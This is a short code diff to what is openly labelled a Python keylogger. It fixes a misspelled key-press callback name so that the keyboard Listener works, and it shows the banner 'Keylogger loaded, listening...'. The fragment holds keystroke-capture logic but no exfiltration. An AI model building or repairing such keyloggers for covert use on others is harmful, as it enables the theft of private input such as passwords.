@@ -13,7 +13,7 @@ keys = []
 
 
 # This function is called when a key is pressed
-def one_press(key):
+def on_press(key):
     global keys, count
 
     keys.append(key)
@@ -58,7 +58,7 @@ which function to call on a key release
 
 The .join() method will keey the Listener active until a value of False is returned
 '''
-with Listener(one_press,on_release) as listener:
+with Listener(on_press,on_release) as listener:
     print("\n")
     print(f"{'*'*50}")
     print("Keylogger loaded, listening...".center(50))
